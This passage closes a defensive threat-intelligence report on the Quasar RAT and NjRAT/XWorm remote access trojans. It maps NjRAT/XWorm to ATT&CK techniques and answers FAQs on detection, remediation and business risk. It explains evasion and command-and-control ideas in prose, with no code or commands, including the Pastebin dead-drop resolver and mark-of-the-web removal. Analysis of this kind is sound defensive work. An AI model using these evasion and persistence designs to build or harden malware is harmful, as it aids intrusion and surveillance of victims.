      <td class="confirmed">CONFIRMED</td>
    </tr>
  </tbody>
</table>

### NjRAT/XWorm - ATT&CK Mapping

<table class="professional-table">
  <thead>
    <tr>
      <th>Tactic</th>
      <th>Technique ID</th>
      <th>Technique Name</th>
      <th>Evidence</th>
      <th>Confidence</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><strong>Execution</strong></td>
      <td>T1204.002</td>
      <td>User Execution: Malicious File</td>
      <td>Requires user to execute initial payload</td>
      <td class="confirmed">CONFIRMED</td>
    </tr>
    <tr>
      <td><strong>Persistence</strong></td>
      <td>T1053.005</td>
      <td>Scheduled Task/Job: Scheduled Task</td>
      <td>1-minute interval scheduled task confirmed</td>
      <td class="confirmed">CONFIRMED</td>
    </tr>
    <tr>
      <td><strong>Persistence</strong></td>
      <td>T1547.001</td>
      <td>Boot or Logon Autostart Execution: Registry Run Keys</td>
      <td>HKCU\...\Run registry key creation confirmed</td>
      <td class="confirmed">CONFIRMED</td>
    </tr>
    <tr>
      <td><strong>Persistence</strong></td>
      <td>T1547.009</td>
      <td>Boot or Logon Autostart Execution: Startup Folder</td>
      <td>Startup folder shortcut creation confirmed</td>
      <td class="confirmed">CONFIRMED</td>
    </tr>
    <tr>
      <td><strong>Defense Evasion</strong></td>
      <td>T1070.004</td>
      <td>Indicator Removal: File Deletion</td>
      <td>self delete capability (CAPA)</td>
      <td class="confirmed">CONFIRMED</td>
    </tr>
    <tr>
      <td><strong>Credential Access</strong></td>
      <td>T1056.001</td>
      <td>Input Capture: Keylogging</td>
      <td>Keyboard hook with clipboard monitoring confirmed</td>
      <td class="confirmed">CONFIRMED</td>
    </tr>
    <tr>
      <td><strong>Collection</strong></td>
      <td>T1113</td>
      <td>Screen Capture</td>
      <td>Screen recording capability observed</td>
      <td class="confirmed">CONFIRMED</td>
    </tr>
    <tr>
      <td><strong>Collection</strong></td>
      <td>T1125</td>
      <td>Video Capture</td>
      <td>Webcam streaming functionality confirmed</td>
      <td class="confirmed">CONFIRMED</td>
    </tr>
    <tr>
      <td><strong>Collection</strong></td>
      <td>T1123</td>
      <td>Audio Capture</td>
      <td>Microphone recording capability confirmed</td>
      <td class="confirmed">CONFIRMED</td>
    </tr>
    <tr>
      <td><strong>Command and Control</strong></td>
      <td>T1102.001</td>
      <td>Web Service: Dead Drop Resolver</td>
      <td>Pastebin dead-drop for C2 resolution confirmed</td>
      <td class="confirmed">CONFIRMED</td>
    </tr>
    <tr>
      <td><strong>Command and Control</strong></td>
      <td>T1071.001</td>
      <td>Application Layer Protocol: Web Protocols</td>
      <td>HTTP(S) to Pastebin for C2 retrieval confirmed</td>
      <td class="confirmed">CONFIRMED</td>
    </tr>
    <tr>
      <td><strong>Impact</strong></td>
      <td>T1489</td>
      <td>Service Stop</td>
      <td>Capability to terminate processes/services</td>
      <td class="confirmed">CONFIRMED</td>
    </tr>
  </tbody>
</table>

---

## Frequently Asked Questions

### Technical Questions

**Q: Why does Quasar RAT use process injection while NjRAT/XWorm doesn't?**  
A: Quasar's stealth-focused design prioritizes evading detection by hiding malicious code within legitimate processes. NjRAT's resilience-focused design accepts higher detection risk in favor of aggressive persistence and rapid recovery.

**Q: How effective is Pastebin dead-drop architecture for C2 resilience?**  
A: The architecture is highly effective for the attacker. Changing C2 infrastructure requires only editing a Pastebin post — no malware redeployment. Takedown operations against individual C2 IPs do not neutralize already-deployed implants. Behavior-based detection (monitoring for the Pastebin request followed by arbitrary TCP) is the reliable detection path.

**Q: What makes the 1-minute scheduled task so unusual?**  
A: Legitimate software rarely uses sub-5-minute intervals for scheduled tasks. This aggressive frequency ensures rapid recovery from process termination but creates obvious detection opportunities for security monitoring.

**Q: How does the "mark of the web" removal work technically?**  
A: Windows stores download source information in alternate data streams (file:Zone.Identifier). The malware uses DeleteFile API to remove this stream, bypassing SmartScreen warnings and making the file appear locally created.

### Business Questions

**Q: Which malware poses greater business risk?**  
A: Quasar RAT poses greater risk for high-value targets due to its stealth capabilities and APT10 association. NjRAT/XWorm poses greater risk for mass compromise due to its prevalence and resilience.

**Q: Should compromised systems be rebuilt?**  
A: System rebuild is the recommended remediation posture for both families, and especially for Quasar RAT. Quasar's process injection and anti-analysis capabilities make complete forensic validation of a cleaned system difficult; long-term stealthy access is its design goal. For NjRAT/XWorm, the triple persistence and critical-process protection add procedural complexity to in-place remediation.

**Q: How can these threats be detected when they evade traditional antivirus?**  
A: Behavioral EDR covering process injection and scheduled task anomalies is the primary detection layer. Network monitoring for Pastebin access patterns followed by arbitrary TCP connections catches NjRAT/XWorm's C2 resolution. The provided YARA and Sigma detection rules are deployable as a starting point for both families.

**Q: What are the regulatory implications of these infections?**  
A: Both RATs enable comprehensive data theft and surveillance — keylogging, screen capture, browser credential extraction, and webcam/microphone streaming. Depending on the nature of data accessible to compromised endpoints, such capabilities may trigger notification and reporting obligations under data protection and privacy regulations. Regulatory exposure should be assessed against the specific data environment affected.

---

### IOCs
- [Dual-RAT Analysis IOCs]({{ "/ioc-feeds/dual-rat-analysis.json" | relative_url }})

### Detections
- [Dual-RAT Analysis Detections]({{ "/hunting-detections/dual-rat-analysis/" | relative_url }})

---

## License

© 2026 Joseph, The Hunters Ledger. Licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/) — free to republish and adapt, including commercially, with attribution to The Hunters Ledger and a link to the original.
